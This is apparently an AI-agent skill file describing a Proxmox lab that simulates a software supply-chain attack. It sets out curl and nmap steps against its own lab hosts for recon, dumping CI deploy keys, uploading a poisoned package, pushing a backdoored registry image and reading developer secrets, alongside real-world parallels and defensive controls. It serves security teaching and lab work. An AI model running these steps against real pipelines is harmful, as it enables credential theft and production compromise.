---
name: supply-chain-attack-lab
description: Full supply-chain attack simulation — initial compromise, dependency poisoning, artifact tampering, dev secrets exfiltration. Covers Proxmox container lab setup and multi-phase attack chain with real-world parallels (SolarWinds, CodeCov, 3CX, LastPass).
---

# Supply Chain Attack Lab

End-to-end supply-chain attack simulation. From a leaked credential on an unrelated host, through dependency poisoning and artifact tampering, to production deployment compromise. Contains both **lab deployment** and **attack execution**.

## Lab Architecture

```
  vmbr0 (192.168.8.0/24)              vmbr1 (10.66.0.0/24) — ISOLATED
  ════════════════════════              ═══════════════════════════

  victim-web (500)                     sc-ci-runner (310)     10.66.0.10
  ┌──────────────────┐                 ┌────────────────────────┐
  │ 192.168.8.50     │                 │ :9000 CI webhook       │
  │ .env.bak exposed │                 │ Build DB (SQLite)      │
  │ admin panel      │                 │ Deploy keys leaked     │
  │ SSH private key  │                 └────────────────────────┘
  │ weak passwords   │                          │
  └──────────────────┘                          │ pulls deps
          │                                     ▼
          │ leaked cred                    sc-dep-proxy (311)     10.66.0.11
          │ admin:SuperSecretDB2026!       ┌────────────────────────┐
          │ points to 10.66.0.10           │ :8888 Internal PyPI    │
          ▼                                │ internal-lib v1.0.0    │
    [attacker pivots]                      │ company-auth v2.3.1    │
                                           └────────────────────────┘
                                                    │
                                                    │ CI pushes builds
                                                    ▼
                                           sc-artifact-reg (312)  10.66.0.12
                                           ┌────────────────────────┐
                                           │ :5000 Docker Registry  │
                                           │ internal-api:v1.2.3    │
                                           │ auth-service:v2.1.0    │
                                           │ frontend:v4.0.1        │
                                           └────────────────────────┘
                                                    │
                                                    │ deploys to
                                                    ▼
                                              PRODUCTION
                                           (us-east-1, eu-west-1,
                                            us-west-2)

  sc-dev-workstn (313)  10.66.0.13         sc-attacker (320)  10.66.0.20
  ┌────────────────────────┐               ┌────────────────────────┐
  │ .env → AWS keys        │               │ Dual-homed (vmbr0+1)   │
  │ api.py → hardcoded DB  │               │ nmap, curl, mysql      │
  │ git repo with secrets  │               │ Attack pivot point     │
  └────────────────────────┘               └────────────────────────┘
```

## Attack Phases

### Phase 1: Initial Compromise

The entry point is a single exposed file on an unrelated web server.

```
victim-web (192.168.8.50)
└── /.env.bak → db_host=10.66.0.10
                 db_user=app_user
                 db_pass=Str0ngDBP@ss!
                 api_key=sk-live-3f7a2b91c8d4e5f6
```

This reveals the existence of an internal network at `10.66.0.0/24` and credentials pointing to `10.66.0.10`.

**Lesson:** Configuration files in web roots are catastrophic. One `.env.bak` exposes the entire internal network topology.

### Phase 2: Internal Recon

Once pivoted onto the internal network (via sc-attacker's dual-homed interface):

```bash
# Scan the internal network from sc-attacker
nmap -sV -T5 -p 3306,5000,8888,9000 10.66.0.10-13

# Results:
# 10.66.0.10:9000 — CI Runner (Python HTTP)
# 10.66.0.11:8888 — Dependency Proxy (Python HTTP)
# 10.66.0.12:5000 — Artifact Registry (Python HTTP)
# 10.66.0.13:22    — Dev Workstation (SSH)
```

**Lesson:** Internal services often have NO authentication. The assumption is "nobody can reach this network."

### Phase 3: CI Runner Enumeration

```bash
curl http://10.66.0.10:9000/
→ Leaks all deploy keys and deployment targets:
  DEPLOY_KEY_XyZ-987654 → prod-us-east-1
  DEPLOY_KEY_AbC-123456 → prod-eu-west-1
  DEPLOY_KEY_PqR-456789 → prod-us-west-2
```

The CI runner exposes its entire build history, including secrets, over an unauthenticated HTTP endpoint.

**Lesson:** CI/CD systems are Tier-1 targets. They contain the keys to production. Protect them like production.

### Phase 4: Dependency Poisoning

```bash
# Replace legitimate package with malicious version
POST http://10.66.0.11:8888/upload
  {"name": "internal-lib", "version": "9.9.9"}
→ Server accepts. Next CI build pulls poisoned package.
```

The internal PyPI proxy has no authentication on uploads. An attacker who reaches the network can replace any package.

**Real-world parallel:** CodeCov (2021) — attackers modified the bash uploader script that thousands of CI pipelines pulled on every run. SolarWinds (2020) — attackers injected malicious code into a DLL that was signed and distributed to 18,000 customers.

**Lesson:** Dependency proxies and package registries must authenticate all uploads. A compromised proxy poisons every downstream consumer.

### Phase 5: Artifact Registry Tampering

```bash
# Push backdoored image
PUT http://10.66.0.12:5000/v2/internal-api/manifests/v9.9.9
→ Registry accepts. Production pulls backdoored image on next deploy.
```

The Docker registry has no authentication. Any image can be pushed. When production's deployment pipeline pulls the latest tag, it gets the attacker's image.

**Real-world parallel:** 3CX (2023) — attackers trojanized the desktop application. Every customer who downloaded the update was compromised. The attack went through the software supply chain.

**Lesson:** Container registries must require authentication for push operations. Image signing (Cosign/Notary) prevents tampering even if the registry is compromised.

### Phase 6: Developer Secrets Exfiltration

```bash
# Read developer workstation files
cat /home/dev/projects/internal-api/.env
→ AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF
→ AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
→ GITLAB_TOKEN=glpat-abcdef1234567890
→ CI_REGISTRY_PASSWORD=r3g1stry-p@ssw0rd!
→ DATABASE_URL=mysql://admin:SuperSecretDB2026!@10.66.0.10:3306/ci_pipeline
```

And in `api.py`:
```python
DB_USER = "admin"
DB_PASS = "SuperSecretDB2026!"
DB_HOST = "10.66.0.10"
DEPLOY_KEY = "DEPLOY_KEY_XyZ-987654"
```

The developer committed secrets into source code and stored `.env` files in the project directory.

**Real-world parallel:** LastPass (2022) — attackers compromised a developer's workstation through a vulnerable Plex server. From there, they accessed source code, credentials, and eventually customer vault metadata.

**Lesson:** Developer workstations are the softest target in the supply chain. One compromised dev machine can leak every production secret.

## The Complete Kill Chain

```
victim-web .env.bak
       │
       ▼  admin:SuperSecretDB2026!
10.66.0.10 (CI Runner)
       │
       ├──→ Leaks 3 deploy keys (prod-us-east-1, eu-west-1, us-west-2)
       │
       └──→ Identifies dep-proxy (10.66.0.11) as build dependency source
               │
               ▼  POST /upload → poisoned internal-lib v9.9.9
      10.66.0.11 (Dep Proxy)
               │
               │  CI build pulls poisoned dep → builds backdoored binary
               │
               ▼  PUT /v2/internal-api/manifests/v9.9.9
      10.66.0.12 (Artifact Registry)
               │
               │  Production pipeline pulls latest tag
               ▼
          PRODUCTION
       (us-east-1, eu-west-1, us-west-2)
               │
               ▼  Exfiltrated from dev workstation:
      10.66.0.13      AWS keys, GitLab token, DB password
```

## Real-World Attack Parallels

| Attack | Year | Our Lab Equivalent |
|--------|------|--------------------|
| **SolarWinds** — build server compromise, signed malicious DLL | CI runner → artifact registry → production pull |
| **CodeCov** — poisoned bash uploader, thousands of CI pipelines affected | Dep proxy: upload malicious package → CI pulls it |
| **3CX** — trojanized desktop app via update mechanism | Registry: push backdoored image → production deploys it |
| **LastPass** — developer workstation compromise → source code leak | Dev WS: .env + hardcoded secrets → AWS/GitLab tokens |
| **Dependency Confusion** — public package with internal name | Dep proxy: anonymous upload → overwrite internal package |
| **CircleCI** — CI runner credential theft via malware | CI runner: unauthenticated API leaks all deploy keys |

## Defensive Controls

For each phase, here's what should have stopped the attack:

| Phase | Attack | Control That Would Have Stopped It |
|-------|--------|-----------------------------------|
| 1 | .env.bak exposed on web root | Web server config: deny `*.bak`, `*.env`, `*.git` |
| 2 | Internal network pivot | Network segmentation with firewall between vmbr0/vmbr1 |
| 3 | CI runner leaks deploy keys | API authentication required; secrets in vault, not DB |
| 4 | Dependency poisoning | Dep proxy requires authentication for upload + package signing |
| 5 | Registry tampering | Registry requires auth for push + Cosign image signing |
| 6 | Dev secrets exfiltration | `.env` in `.gitignore`; secrets in vault; pre-commit hooks |

## Lab Deployment

All services use **Python 3 stdlib only** — zero package installs needed.

### Prerequisites
- Proxmox VE 8.x/9.x with LXC containers
- Ubuntu 24.04 container templates
- `sc-*` containers (310-320) already provisioned

### Start the Lab

```bash
# From Proxmox host
pct start 310 311 312 313 320

# Deploy services (systemd units that survive reboots)
# See scripts/deploy-sc-lab.sh in this skill

# Verify
ss -tlnp  # Check ports 9000, 8888, 5000 on respective containers
```

### Attack from sc-attacker

```bash
# 1. Recon
nmap -sV -T5 10.66.0.10-13

# 2. Dump CI runner secrets
curl http://10.66.0.10:9000/

# 3. Poison a dependency
curl -X POST http://10.66.0.11:8888/upload \
  -H "Content-Type: application/json" \
  -d '{"name":"internal-lib","version":"9.9.9"}'

# 4. Push backdoored image
curl -X PUT http://10.66.0.12:5000/v2/internal-api/manifests/v9.9.9

# 5. Read dev secrets (via Proxmox host)
pct exec 313 -- cat /home/dev/projects/internal-api/.env
```

## Key Takeaways

1. **The weakest link defines the chain.** One exposed `.env.bak` on an unrelated server was enough to compromise the entire software delivery pipeline.

2. **Internal networks are not security boundaries.** Every service on 10.66.0.0/24 had zero authentication because "nobody can reach it." The attacker reached it.

3. **CI/CD is production.** The CI runner held deploy keys to 3 production regions. It should be protected at the same level as production. Compromising CI means compromising production.

4. **Dependencies are transitive trust.** Poisoning one internal library (`internal-lib`) at the proxy affected every project that depended on it. The blast radius of a dependency attack is the entire dependency graph.

5. **Developer workstations are the new perimeter.** They hold `.env` files, SSH keys, AWS credentials, GitLab tokens. One compromised dev machine leaks everything.

6. **Supply chain attacks are force multipliers.** One initial compromise → 3 production regions, unlimited dependencies, every downstream consumer. Traditional perimeter defense doesn't stop this.

## Deployment Pitfalls

### SSH + pct exec quoting hell

Do NOT try to run complex scripts through nested SSH quoting. The escaping through `ssh → bash -c → pct exec → bash -c → python3 << EOF` will destroy variable names, flatten heredocs, and eat characters silently.

**Wrong approach (will corrupt variable names and fail silently):**
```bash
ssh root@proxmox "pct exec 310 -- bash -c \"python3 << 'PYEOF'
...code with \$variables and \"quotes\"...
PYEOF\""
```

**Right approach (write to filesystem, push, execute):**
```bash
# 1. Write script to Proxmox host filesystem
cat > /tmp/setup.sh << 'EOF'
#!/bin/bash
# ... any bash/python here, no escaping needed ...
EOF

# 2. Push into container
pct push 310 /tmp/setup.sh /tmp/setup.sh

# 3. Execute inside container
pct exec 310 -- bash /tmp/setup.sh
```

For multi-service deployment, combine with `pct push` for each container's script.

### pct exec kills background processes

Python daemon threads started via `pct exec -- python3 << 'PYEOF' &` will die when the pct exec session closes. `nohup` does not help — LXC attaches to the session and terminates it.

**Wrong approach (daemon dies silently):**
```bash
pct exec 310 -- python3 << 'PYEOF' &
import threading
# ... start daemon thread ...
threading.Thread(target=srv.serve_forever, daemon=True).start()
PYEOF
# Process gone as soon as pct exec exits
```

**Right approach (systemd units):**
```bash
# 1. Write the Python service to a file
cat > /tmp/service.py << 'PYEOF'
import socketserver
# ... service code ...
socketserver.TCPServer(("0.0.0.0", 9000), Handler).serve_forever()
PYEOF

# 2. Create a systemd unit
cat > /tmp/service.service << 'UNIT'
[Unit]
Description=My Service
After=network.target
[Service]
ExecStart=/usr/bin/python3 /opt/service.py
Restart=always
[Install]
WantedBy=multi-user.target
UNIT

# 3. Push both files and enable
pct push 310 /tmp/service.py /opt/service.py
pct push 310 /tmp/service.service /etc/systemd/system/service.service
pct exec 310 -- systemctl daemon-reload
pct exec 310 -- systemctl enable --now service
```

This survives container reboots, pct exec disconnects, and service crashes.

### All containers already have python3

Ubuntu 24.04 LXC containers ship with Python 3 in the stdlib. Do not `apt-get install` anything for the lab — every service can be built with `http.server`, `socketserver`, `sqlite3`, `json`, and `subprocess` from stdlib. The apt-get timeout failures in the original deployment were entirely avoidable.

## Repository

The standalone, self-contained lab is at **[github.com/dazeb/ai-supply-chain-lab](https://github.com/dazeb/ai-supply-chain-lab)** — includes lateral movement diagram, both skills, deployment scripts, and the blog post as reference material.

## Related Skills

- `proxmox-pentesting` — Proxmox hypervisor pentesting
- `exploiting-api-injection-vulnerabilities` — API injection testing
- `testing-for-sensitive-data-exposure` — Finding exposed secrets
- `conducting-internal-network-penetration-test` — Internal pivot techniques
- `analyzing-sbom-for-supply-chain-vulnerabilities` — SBOM analysis
